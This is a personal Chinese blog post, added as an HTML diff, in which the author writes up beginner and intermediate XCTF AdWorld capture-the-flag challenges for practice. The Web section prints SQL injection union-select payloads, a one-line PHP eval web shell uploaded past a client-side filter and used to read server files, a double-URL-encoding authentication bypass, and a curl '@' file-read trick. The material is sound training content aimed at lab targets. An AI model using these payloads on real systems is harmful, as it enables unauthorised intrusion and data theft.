@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://guo.moe/favicon.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://guo.moe/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guo.moe","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言我是个菜鸡，菜鸡就要先走新手练习区。 这次 CTF Writeup 的指定训练站点为 攻防世界">
+<meta property="og:type" content="article">
+<meta property="og:title" content="菜鸡 CTF 之旅 Writeup （攻防世界）">
+<meta property="og:url" content="https://guo.moe/archives/CTF-Writeup-adworld.html">
+<meta property="og:site_name" content="果果说">
+<meta property="og:description" content="前言我是个菜鸡，菜鸡就要先走新手练习区。 这次 CTF Writeup 的指定训练站点为 攻防世界">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://guo.moe/images/Article/CTF-Writeup/pdf.png">
+<meta property="og:image" content="https://guo.moe/images/Article/CTF-Writeup/word-na.png">
+<meta property="og:image" content="https://guo.moe/images/Article/CTF-Writeup/tudoucode.png">
+<meta property="og:image" content="https://guo.moe/images/Article/CTF-Writeup/cat.png">
+<meta property="og:image" content="https://guo.moe/images/Article/CTF-Writeup/cat-php-curl.png">
+<meta property="article:published_time" content="2020-01-09T01:46:01.000Z">
+<meta property="article:modified_time" content="2021-06-11T09:18:07.000Z">
+<meta property="article:author" content="Guoguo">
+<meta property="article:tag" content="瞎搞">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guo.moe/images/Article/CTF-Writeup/pdf.png">
+
+<link rel="canonical" href="https://guo.moe/archives/CTF-Writeup-adworld.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>菜鸡 CTF 之旅 Writeup （攻防世界） | 果果说</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-69554402-1"></script>
+    <script data-pjax>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-69554402-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="果果说" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">果果说</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Guoguo's Blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友情链接">
+
+    <a href="/links/" rel="section"><i class="fa fa-user fa-fw"></i>友情链接</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guo.moe/archives/CTF-Writeup-adworld.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://guo.moe/favicon.jpg">
+      <meta itemprop="name" content="Guoguo">
+      <meta itemprop="description" content="找不到路，就自己走一条出来。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="果果说">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          菜鸡 CTF 之旅 Writeup （攻防世界）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-09 09:46:01" itemprop="dateCreated datePublished" datetime="2020-01-09T09:46:01+08:00">2020-01-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-11 17:18:07" itemprop="dateModified" datetime="2021-06-11T17:18:07+08:00">2021-06-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/" itemprop="url" rel="index"><span itemprop="name">技术篇</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我是个菜鸡，菜鸡就要先走新手练习区。</p>
+<p>这次 CTF Writeup 的指定训练站点为 <a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">攻防世界</a></p>
+<span id="more"></span>
+
+<h1 id="新手练习区"><a href="#新手练习区" class="headerlink" title="新手练习区"></a>新手练习区</h1><h2 id="Web-区"><a href="#Web-区" class="headerlink" title="Web 区"></a>Web 区</h2><h3 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h3><p>题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。</p>
+<p>解答步骤：直接在地址栏前加上 view-source: 拿到 HTML 注释中的</p>
+<pre><code>cyberpeace&#123;f3baff125*********f3cf5a7e6&#125;
+</code></pre>
+<h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>解答步骤：地址栏后加上 /robots.txt ，得到</p>
+<pre><code>User-agent: *
+Disallow: 
+Disallow: f1ag_1s_h3re.php
+</code></pre>
+<p>访问 /f1ag_1s_h3re.php 得到 flag </p>
+<h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>解答步骤：访问 index.php.bak，记事本打开得 flag</p>
+<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>解答步骤：查看 cookie 看到要求访问 cookie.php，要求查看http response，看response header得到flag</p>
+<h2 id="MISC-区"><a href="#MISC-区" class="headerlink" title="MISC 区"></a>MISC 区</h2><h3 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this is flag"></a>this is flag</h3><p>题目描述：Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}</p>
+<p>解答步骤：直接填入 flag{th1s_!s_a_d4m0_4la9}</p>
+<h3 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h3><p>题目描述：菜猫给了菜狗一张图，说图下面什么都没有</p>
+<p>附件：一份 PDF</p>
+<p>解答步骤：我一开始还想用 Word 转换 PDF 再尝试的，结果发现 Word 转换后字没了，然后试了一下 Ctrl+A，发现获取到文字，Ctrl+C 拿到 flag{security_through_obscurity}</p>
+<p><img data-src="/images/Article/CTF-Writeup/pdf.png" alt="/images/Article/CTF-Writeup/pdf.png"></p>
+<p><del>果然 Ctrl+A 和 Ctrl+C 是人类第一生产力</del></p>
+<h3 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h3><p>题目描述：菜狗为了打败菜猫，学了一套如来十三掌。</p>
+<p>题目附件：一份 word 文档</p>
+<p><del>打开文档可以看到很多个呐，由此我们可以断定这个是一个二次元 word 档（不是</del></p>
+<pre><code>夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮
+</code></pre>
+<p><img data-src="/images/Article/CTF-Writeup/word-na.png" alt="/images/Article/CTF-Writeup/word-na.png"></p>
+<p>没有思路，所以上网一搜，找到了解码站 <a target="_blank" rel="noopener" href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a></p>
+<p>复制内容粘贴到下方解码框，发现提示：太深奥了，参悟不出佛经的真意……</p>
+<p>于是随意输入文本，加密后出现开头 “佛曰：”，添加后再次解密</p>
+<p>获得一串字符串</p>
+<p><img data-src="/images/Article/CTF-Writeup/tudoucode.png" alt="/images/Article/CTF-Writeup/tudoucode.png"></p>
+<p><del>上网随意找一个 Rot13 解密工具</del></p>
+<p>这玩意还真不能随便找，要找一个不会全部替换为小写的用，不然的话搞半天就白搞</p>
+<p>解密后得</p>
+<pre><code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9
+</code></pre>
+<p>得到 flag</p>
+<pre><code>flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;
+</code></pre>
+<h1 id="高手进阶区"><a href="#高手进阶区" class="headerlink" title="高手进阶区"></a>高手进阶区</h1><h2 id="Web-区-1"><a href="#Web-区-1" class="headerlink" title="Web 区"></a>Web 区</h2><h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>访问 /robots.txt 要求访问 /fl0g ，访问获得flag</p>
+<h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>F12 访问 /  看 response header 得到 flag</p>
+<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><p>这题。。。实属没思路，直接复制上网找题，发现是经过修改的，而且改得都找不出来</p>
+<p>地址栏改为 /index.phps ，发现源码</p>
+<pre><code>&lt;?php
+// 不允许字符串直接等于 admin
+if(&quot;admin&quot;===$_GET[id]) &#123;
+  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
+  exit();
+&#125;
+// URLDecode 后又要等于 admin
+$_GET[id] = urldecode($_GET[id]);
+if($_GET[id] == &quot;admin&quot;)
+&#123;
+  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
+  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;
+&#125;
+?&gt;
+
+Can you anthenticate to this website?
+</code></pre>
+<p>所以知道要将 admin 进行 encode 一下，得 %2561%2564%256d%2569%256e</p>
+<p>访问 /index.php?id=%2561%2564%256d%2569%256e</p>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>题目内容如下</p>
+<pre><code>&lt;?php
+$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
+
+function encode($str)&#123;
+    $_o=strrev($str);
+    // echo $_o;
+        
+    for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;
+       
+        $_c=substr($_o,$_0,1);
+        $__=ord($_c)+1;
+        $_c=chr($__);
+        $_=$_.$_c;   
+    &#125; 
+    return str_rot13(strrev(base64_encode($_)));
+&#125;
+
+highlight_file(__FILE__);
+/*
+   逆向加密算法，解密$miwen就是flag
+*/
+?&gt;
+</code></pre>
+<p>由代码可知，从底下开始，按照 str_rot13、strrev、base64_decode 的顺序进行逐级解密，得 ~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg ，观察中间 for 循环可以发现就是将其转为整数类型再往后移一位，眼尖的看解密后的可以直接看出来是类似于 flag:{ 一类的东西。</p>
+<p>按照其代码<del>(和变量风格)</del>可以反向写出</p>
+<pre><code>&lt;?php
+function decode($pass)&#123;
+    $_o =  base64_decode(strrev(str_rot13($pass)));
+    
+    $_ = &#39;&#39;;
+    
+        for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;
+           
+            $_c=substr($_o,$_0,1);
+            $__=ord($_c)-1;
+            $_c=chr($__);
+            $_=$_.$_c;   
+        &#125; 
+</code></pre>
+<p>​<br>        return strrev($_);<br>    }</p>
+<pre><code>echo decode(&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;); // flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;
+?&gt;
+</code></pre>
+<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>打开出现一个框，输入 ‘ 后报 500 错误</p>
+<p>输入 </p>
+<pre><code>&#39; union select 1,2,3 #
+</code></pre>
+<p>后 News 出现 2 | 3，输入</p>
+<pre><code>&#39; union select 1,TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES #
+&#39; union select 1,TABLE_NAME,COLUMN_NAME from information_schema.COLUMNS #
+</code></pre>
+<p>分别可得知 1 中包含关键词 news, secret_table，2 中包含关键词 secret_table, fl4g，即存在一个 secret_table 表在 news 数据库中，同时在 secret_table 又有一个 fl4g 的字段，最后输入</p>
+<pre><code>&#39; union select 1,&#39;2&#39;,fl4g from secret_table #
+</code></pre>
+<p>可得 flag</p>
+<h3 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h3><p>进入网站，上传图片发现问题木大，且有详细路径，上传 .php 发现被拦截，查看源代码发现是前端拦截，遂直接去掉 js 重新上传，内容</p>
+<pre><code>&lt;?php
+    eval($_GET[&#39;cmd&#39;]);
+?&gt;
+</code></pre>
+<p>上传成功，显示路径，访问 </p>
+<pre><code>/upload/1579158279.a.php?cmd=print_r(scandir(__DIR__ . &#39;/../&#39;), false);
+
+# Output
+Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.html [4] =&gt; index.php [5] =&gt; install.sh [6] =&gt; upload )
+</code></pre>
+<p>​<br>    /upload/1579158279.a.php?cmd=echo file_get_contents(<strong>DIR</strong> . ‘/../flag.php’);</p>
+<pre><code># Output
+&lt;?php
+$flag=&quot;cyberpeace&#123;a87d78****************d3da76&#125;&quot;;
+?&gt;
+</code></pre>
+<p>得到 flag</p>
+<h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>输入 <a target="_blank" rel="noopener" href="http://localhost/">localhost</a> 后发现出现一个 ICMP 请求，似乎没什么用</p>
+<p>陆续输入 ;ls 之类的以后发现提示 invaild URL</p>
+<p>输入一个不和谐的 emoji 以后弹出报错信息</p>
+<p><img data-src="/images/Article/CTF-Writeup/cat.png" alt="/images/Article/CTF-Writeup/cat.png"></p>
+<p>根据 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.curl-setopt.php">https://www.php.net/manual/zh/function.curl-setopt.php</a> </p>
+<p><img data-src="/images/Article/CTF-Writeup/cat-php-curl.png" alt="/images/Article/CTF-Writeup/cat-php-curl.png"></p>
+<p>输入 @ 可以传递文件，输入 @/opt/api/dnsapi/utils.py 出 invaild URL，输入 @/opt/api/database.sqlite3 出报错信息，搜索 CTF 得到flag</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%9E%8E%E6%90%9E/" rel="tag"># 瞎搞</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/archives/Happy-New-Year-2020.html" rel="prev" title="元旦快乐">
+      <i class="fa fa-chevron-left"></i> 元旦快乐
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/archives/goodbye-2019-hello-2020.html" rel="next" title="再见 2019，你好 2020">
+      再见 2019，你好 2020 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA"><span class="nav-number">2.</span> <span class="nav-text">新手练习区</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-%E5%8C%BA"><span class="nav-number">2.1.</span> <span class="nav-text">Web 区</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#view-source"><span class="nav-number">2.1.1.</span> <span class="nav-text">view_source</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#robots"><span class="nav-number">2.1.2.</span> <span class="nav-text">robots</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#backup"><span class="nav-number">2.1.3.</span> <span class="nav-text">backup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie"><span class="nav-number">2.1.4.</span> <span class="nav-text">cookie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC-%E5%8C%BA"><span class="nav-number">2.2.</span> <span class="nav-text">MISC 区</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#this-is-flag"><span class="nav-number">2.2.1.</span> <span class="nav-text">this is flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pdf"><span class="nav-number">2.2.2.</span> <span class="nav-text">pdf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E6%9D%A5%E5%8D%81%E4%B8%89%E6%8E%8C"><span class="nav-number">2.2.3.</span> <span class="nav-text">如来十三掌</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA"><span class="nav-number">3.</span> <span class="nav-text">高手进阶区</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-%E5%8C%BA-1"><span class="nav-number">3.1.</span> <span class="nav-text">Web 区</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Training-WWW-Robots"><span class="nav-number">3.1.1.</span> <span class="nav-text">Training-WWW-Robots</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-web"><span class="nav-number">3.1.2.</span> <span class="nav-text">baby_web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP2"><span class="nav-number">3.1.3.</span> <span class="nav-text">PHP2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web2"><span class="nav-number">3.1.4.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NewsCenter"><span class="nav-number">3.1.5.</span> <span class="nav-text">NewsCenter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#upload1"><span class="nav-number">3.1.6.</span> <span class="nav-text">upload1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cat"><span class="nav-number">3.1.7.</span> <span class="nav-text">Cat</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Guoguo"
+      src="https://guo.moe/favicon.jpg">
+  <p class="site-author-name" itemprop="name">Guoguo</p>
+  <div class="site-description" itemprop="description">找不到路，就自己走一条出来。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/imguoguo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;imguoguo" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:blog@guo.moe" title="E-Mail → mailto:blog@guo.moe"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Guoguo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/medium-zoom.min.js"></script>
+  <script src="/lib/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js', () => {
+    window.dsqjs = new DisqusJS({
+      api       : 'https://disqus.guo.moe/api/' || 'https://disqus.com/api/',
+      apikey    : 'TRTXJqZLCwf51OCjLAd1u320K7DxrMxK37Ch9X2xFXy5Q4d2gdVBKeMT33qizKh9',
+      shortname : 'guoguoblog',
+      url       : "https://guo.moe/archives/CTF-Writeup-adworld.html",
+      identifier: "archives/CTF-Writeup-adworld.html",
+      title     : "菜鸡 CTF 之旅 Writeup （攻防世界）",
+    });
+  }, window.DisqusJS);
+});
+</script>
+
+    </div>
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
